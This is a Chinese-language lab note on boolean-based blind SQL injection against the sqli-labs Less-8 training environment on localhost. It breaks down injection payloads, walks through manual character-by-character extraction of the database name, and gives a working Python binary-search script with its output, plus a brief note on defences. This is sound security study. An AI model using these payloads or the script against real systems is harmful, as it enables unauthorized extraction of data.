# P1-01 布尔盲注（Boolean-based Blind SQL Injection）

> 日期：2026-10-13 ｜ 环境：sqli-labs Less-8（Docker，`localhost:8083`）｜ 前置：D5 有回显 SQL 注入

## 一句话原理

页面**不直接返回数据**，只能通过构造真/假条件、观察页面两种状态的差异（显示 / 不显示 `You are in`），把数据库当成"只能回答是/否"的黑盒，一位一位推断数据。

## payload 拆解

以 `?id=1' AND 1=1 --+` 为例。正常请求的后端 SQL 约为：

```sql
SELECT * FROM users WHERE id='1' LIMIT 0,1
```

| 输入片段 | 作用 |
|---|---|
| `1'` | `'` 闭合了 SQL 里原来的左引号，从"引号内"逃逸出来 |
| `AND 1=1` | 追加一个恒为**真**的条件 |
| `--+` | SQL 注释符，`+` 是 URL 中的空格；其后原 SQL 尾巴被注释掉 |

实际执行的 SQL 变为 `SELECT * FROM users WHERE id='1' AND 1=1` → 查到 id=1 的行 → 页面显示 `You are in..........`。

换成 `AND 1=2`（恒假）→ 查不到行 → `You are in` 消失。**"显示/消失"就是真/假两个答案。**

## 实战四步（Less-8）

1. **验证 oracle**：`AND 1=1` 显示、`AND 1=2` 消失，确认通道可用。
2. **猜库名长度**：`?id=1' AND length(database())=8 --+` → 显示为真，长度为 8。
3. **逐位猜字母**：`?id=1' AND ascii(substr(database(),1,1))=115 --+` → 为真，首字母 ASCII 115 = `s`。
4. **结果**：`security`（8 字母，与长度吻合）。

> `database()` 返回当前库名字符串；`substr(串,位置,长度)` 下标从 1 开始；`ascii()` 字符→数字。

## 自动化：Python + 二分法

手工猜完 8 个字母约需 50+ 次请求，脚本 1 分钟跑完。核心就三行逻辑：

```python
import requests

BASE = "http://localhost:8083/Less-8/"

def ask(question):
    """问数据库一个是/否问题，返回 True/False"""
    payload = f"1' AND {question} -- "   # 尾空格经 URL 编码后即注释符所需的空格
    r = requests.get(BASE, params={"id": payload}, timeout=10)
    return "You are in" in r.text

# 1. 先问库名长度：第一个回答 True 的 i 就是答案
db_len = next(i for i in range(1, 30) if ask(f"length(database())={i}"))

# 2. 二分法逐位猜字母（每字母约 7 次请求）
name = ""
for pos in range(1, db_len + 1):          # SQL 下标从 1 开始，range 含头不含尾故 +1
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(f"ascii(substr(database(),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    name += chr(lo)                       # ASCII 码转回字母
print("数据库名:", name)
```

真实运行输出：

```
库名长度: 8
第1位: s  (已拼出: s)
第2位: e  (已拼出: se)
第3位: c  (已拼出: sec)
第4位: u  (已拼出: secu)
第5位: r  (已拼出: secur)
第6位: i  (已拼出: securi)
第7位: t  (已拼出: securit)
第8位: y  (已拼出: security)
数据库名: security
```

要点：
- `requests.get(..., params={...})` 自动做 URL 编码，不用手工转义引号和空格。
- `next(i for i in ... if ...)`：生成器是"懒惰"的，找到第一个 True 就停，不会把 29 次全问完。
- `chr()` / `ord()` 是一对：数字→字符 / 字符→数字。
- 永远加 `timeout`，避免请求卡死。

## 函数小抄

| 函数 | 作用 | 例 |
|---|---|---|
| `database()` | 当前库名 | `"security"` |
| `length(s)` | 字符串长度 | `length("security")=8` |
| `substr(s,pos,len)` | 切片（下标从 1 开始） | `substr("security",1,1)="s"` |
| `ascii(c)` | 字符→ASCII 码 | `ascii("s")=115` |
| `chr(n)` / `ord(c)` | Python：数字→字符 / 字符→数字 | `chr(115)="s"` |

## 防御视角（一句话）

盲注的根因是**用户输入被拼进 SQL**：用预编译/参数化查询（PreparedStatement）从根本上消除；同时给数据库账号最小权限、对外脱敏错误信息，能大幅压缩盲注的信息通道。

## 与 D5 的区别

|  | D5 有回显注入 | P1-01 布尔盲注 |
|---|---|---|
| 页面是否直接给数据 | 是（UNION 直接打印） | 否，只能看"显示/消失" |
| 提取方式 | 一次查出一片 | 一次一个是/否问题，逐位猜 |
| 效率 | 高 | 低，必须上自动化脚本 |
